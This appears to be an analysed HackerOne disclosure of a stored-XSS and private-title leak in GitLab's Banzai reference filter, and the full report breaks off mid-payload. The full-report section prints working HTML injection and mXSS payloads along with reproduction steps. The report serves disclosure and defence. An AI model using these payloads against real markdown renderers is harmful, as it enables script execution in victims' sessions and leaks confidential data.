# Stored-XSS via Banzai Pipeline AbstractReferenceFilter gsub Pattern Matching

## Metadata
- **Source:** HackerOne
- **Report:** 2257080 | https://hackerone.com/reports/2257080
- **Submitted:** 2023-11-19
- **Reporter:** yvvdwf
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), HTML Injection, Improper Input Validation, Content Security Policy Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
A vulnerability in GitLab's Banzai pipeline AbstractReferenceFilter allows attackers to inject stored XSS through improperly scoped gsub pattern replacements on link references. By crafting malicious nested HTML with reference patterns in attributes, attackers can break out of intended contexts and inject arbitrary JavaScript that executes with CSP bypass capabilities.

## Attack scenario
1. Attacker creates a GitLab Wiki page with title '_sidebar' containing carefully crafted HTML with nested anchor tags containing reference patterns
2. The HTML payload uses pattern matching boundaries to break out of attribute contexts: e.g., <a href="PATTERN<i><a alt='&quot;PATTERN'></a></i>">PATTERN<i><a alt='"PATTERN'></a></i></a>
3. When AbstractReferenceFilter processes the page, gsub applies link_pattern replacement globally without respecting HTML structure boundaries
4. Pattern expansion in unintended locations (like alt attributes) breaks HTML parsing and introduces attribute injection opportunities
5. By using &quot; entity encoding and nested tags, attacker manipulates attribute boundaries to inject href="//attacker" attributes
6. Stored payload executes when any user visits the wiki page, bypassing CSP and executing arbitrary JavaScript in victim context

## Root cause
AbstractReferenceFilter uses gsub() to replace reference patterns globally across entire text without proper HTML-aware context tracking. The filter checks only the link prefix (link_pattern_start) before applying full pattern replacement, causing matches in HTML attributes and nested structures to be processed identically to text content. This breaks HTML structure and enables attribute injection through careful nesting and entity encoding.

## Attacker mindset
An attacker recognizes that HTML parsing happens before pattern replacement, allowing them to craft inputs where pattern matching occurs inside HTML attributes. By leveraging nested tags and HTML entity encoding (&quot;), they can manipulate attribute boundaries during replacement to inject new attributes. The attacker exploits the fact that replacement doesn't understand HTML context, treating attribute values identically to text content.

## Defensive takeaways
- Apply pattern matching only to text nodes, never to attribute values or raw HTML
- Parse and validate HTML structure before applying text-based transformations; use HTML-aware parsing
- Implement whitelist-based link validation for href and other dangerous attributes
- Use separate processing paths for content vs. attributes; never apply gsub globally to mixed HTML
- Sanitize and escape all replaced content according to context (text vs. attribute)
- Add regression tests for nested HTML structures with entity-encoded patterns
- Consider using proper HTML templating instead of string replacement for reference expansion

## Variant hunting
Test other Banzai filters that use gsub on content containing HTML markup
Search for similar pattern replacements in reference filters (UserReferenceFilter, IssueReferenceFilter, etc.)
Test with various HTML entities and encoding (&#34;, &#x22;, etc.) to break attribute boundaries
Attempt nesting with other tags that don't have class=gfm to bypass redaction
Test mutation of data-original and data-link-reference attributes to evade redaction
Explore whether the vulnerability applies to other wiki-like markdown processors in GitLab

## MITRE ATT&CK
- T1190: Exploit Public-Facing Application
- T1021: Remote Services (via compromised account with wiki access)
- T1598: Phishing (social engineering to visit malicious wiki page)
- T1566: Phishing (wiki link in messages)
- T1204: User Execution (victim visits wiki page)
- T1005: Data from Local System (via XSS stealing session/API tokens)

## Notes
Report demonstrates CSP bypass, suggesting victim's CSP policy is ineffective against inline script execution or the payload uses eval/dynamic code execution vectors. The vulnerability allows both information disclosure (private issue titles via attribute expansion) and arbitrary code execution (via attribute injection). Root cause is fundamental architectural issue: mixing string-based pattern replacement with HTML processing without context awareness.

## Full report
<details><summary>Expand</summary>

Hello,

I found a vulnerability in [AbstractReferenceFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb) class that can be exploited to inject any HTML elements leading to stored-XSS.

# Reproduce

- Create a new project.
- Got to its `Wikis`, `Create your first page` button, then fill the form:
   + Title: `_sidear`
   + Content: please see in `_sidebar.md` attached file ({F2868304})

{F2868305}

   + click `Create page` to save the wiki page
   + after the page is reloaded, you should see an alert which is caused by `alert(document.domain)`
   + **Note:** you will not see the alert if you are the person who can access to the Gitlab confidential issue `https://gitlab.com/gitlab-org/gitlab/-/issues/428268` which is used to track one of my H1 report. (thus, you login using another account, can create a private issue, then replace the link above by your issue's link)


# Impact

Stored-XSS with CSP-bypass allows executing arbitrary javascript at the client side on behalf of victims including any RESTfull API.

# TL;DR

## 1. `gsub`
 
The vulnerable code is as the following:

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L116
        def call
          ...
          link_pattern_start = /\A#{link_pattern}/
          ...
          nodes.each_with_index do |node, index|
            ...
            elsif element_node?(node)
              yield_valid_link(node) do |link, inner_html|
                ...
                if link == inner_html && inner_html =~ link_pattern_start
                  replace_link_node_with_text(node, index) do
                    object_link_filter(inner_html, link_pattern, link_reference: true)
                  end


# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L182
       def object_link_filter(text, pattern, link_content: nil, link_reference: false)
          references_in(text, pattern) do |match, id, project_ref, namespace_ref, matches|
            ...
            if object
              ... 
              link = ...

# https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/references/abstract_reference_filter.rb#L38
    def references_in(text, pattern = object_class.reference_pattern)
          text.gsub(pattern) do |match|
            if ident = identifier($~)
              yield match, ident, $~[:project], $~[:namespace], $~
            else
              match
            end
          end
        end
```

I'm not sure for which reason `link_pattern_start` is used to check **only** the prefix of `link_pattern` (not the whole) in the first function of the listing above. And latter the `link_pattern` is used in `gsub` to replace **any** occurrences in the third function. Consider the following HTML snippet:

```html
<a href="LINK_PATTERN<a alt='&quot;LINK_PATTERN'></a>">LINK_PATTERN<a alt='"LINK_PATTERN'></a></a>
```

The second replacement of `LINK_PATTERN` will expanse the corresponding information into `alt` attribute. This information will never be redacted as it tag `<a>` does not have `class = gfm`. This can be used to disclose titles of private  [GitLab-specific references](https://docs.gitlab.com/ee/user/markdown.html#gitlab-specific-references)

For example, open an issue with the following content (we need `<i>` tag to have  nested `<a>` tags):

- input:
```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a alt='"https://gitlab.com/gitlab-org/gitlab/-/issues/428268'></a></i></a></dl>
```

- output: we can get the title of Gitlab's confidential issue 428268:


{F2868307}


## 2. `&quot;`

Now if we replace single quot by double one, and add `href` attribute as the following:

```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href=&quot;//xxx&quot; alt=&quot;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot;></a></i>">https://gitlab.com/gitlab-org/gitlab/-/issues/428268<i><a href="//xxx" alt="https://gitlab.com/gitlab-org/gitlab/-/issues/428268"></a></i></a></dl>
```

We get the result:

{F2868306}

Because the second replacement of `LINK_PATTERN` broke down the double quotes of `alt` to introduce other attributes. The result was latter redacted by:

```ruby
# https://gitlab.com/gitlab-org/gitlab/blob/e03b60053f7f7d35c05b2732f59524a6bc6a5456/lib/banzai/reference_redactor.rb#L66
  def redacted_node_content(node)
      original_content = node.attr('data-original')
      original_content = CGI.escape_html(original_content) if original_content

      original_link =
        if node.attr('data-link-reference') == 'true'
          href = node.attr('href')

          %(<a href="#{href}">#{original_content}</a>)
        end

      original_link || original_content || node.inner_html
    end
```

This means that if we can inject `&quot;` in to the `href` attribute, then we can break it.

Fortunately, the [Sanitize](https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40) is here and it replaces `"` by `%22` in the `href` attribute.

```ruby
# https://github.com/rgrove/sanitize/blob/v6.0.0/lib/sanitize/transformers/clean_element.rb#L27-L40

  # Mapping of original characters to escape sequences for characters that
  # should be escaped in attributes affected by unsafe libxml2 behavior.
  UNSAFE_LIBXML_ESCAPE_CHARS = {
    ' ' => '%20',
    '"' => '%22'
  }
```


Any users' direct input of `href` is sanitized but not the `href` which are generated by other HTML filters. One of them is [GollumTagsFilter](https://gitlab.com/gitlab-org/gitlab/blob/4c3239a8b20a104a15e067f208f269f65dbee927/lib/banzai/filter/gollum_tags_filter.rb#L141). 

If we provide the following input:

```
[[a|http:'"&lt;]]
```

then we get:

```html
<a rel="nofollow noreferrer noopener" class="gfm" href="http:'&quot;&lt;" target="_blank">a</a>
```


So fare, we can introduce any attribute into `<a>` tag, or add arbitrary tag. The latter will have no attribute because no space between tag name and attribute (any space character is URI encoded when serializing `href`). 

For example:

- input:

```html
<dl><a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268*&lt;i&gt;&lt;a href=&quot;http:&#39;&amp;quot;yvvdwf=here&amp;gt;&amp;lt;img/src=&amp;quot;0&amp;quot;onerror=&amp;quot;alert(0)&amp;quot;&amp;gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268&quot; class=&quot;gfm&quot;&gt;a&lt;/a&gt;&lt;/i&gt;">https://gitlab.com/gitlab-org/gitlab/-/issues/428268*<i>[[a|http:'"yvvdwf=here&gt;&lt;img/src="0"onerror="alert(0)"&gt;https://gitlab.com/gitlab-org/gitlab/-/issues/428268]]</i></a></dl> 
```

- output:

```html
<dl>&#x000A;<a href="https://gitlab.com/gitlab-org/gitlab/-/issues/428268">https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>*<i><a href="http:'" yvvdwf="here"><img></a><a>https://gitlab.com/gitlab-org/gitlab/-/issues/428268</a>" class="gfm"&gt;a</i>&#x000A;</dl>
```

## 3. mXSS

The backend parses HTML by using Nokogiri with HTML4 format. HTML4 accepts only space characters between tag name and the attribute. Howeverthe browser supports HTML5 which tolerate some additional characters, such as `/`.

For example, this snippet `<img/src="0"onerror="alert(0)">` will give different result:
- `<img>` at the backend {F2868308}
- `<img src="0" onerror="alert(0)">` at the browser

As we can inject any tag, we use `<style>` to keep inside the snippet which will be sent to browser as-is:

```html
<style><img/src="0"onerror="alert(0)"></style>
```

Finally, to be able to get the `<img>` tag back, we put all of them inside `<svg>` tag:

```html
<svg><style><img/src="0"onerro

</details>

---
*Analysed by Claude on 2026-05-12*
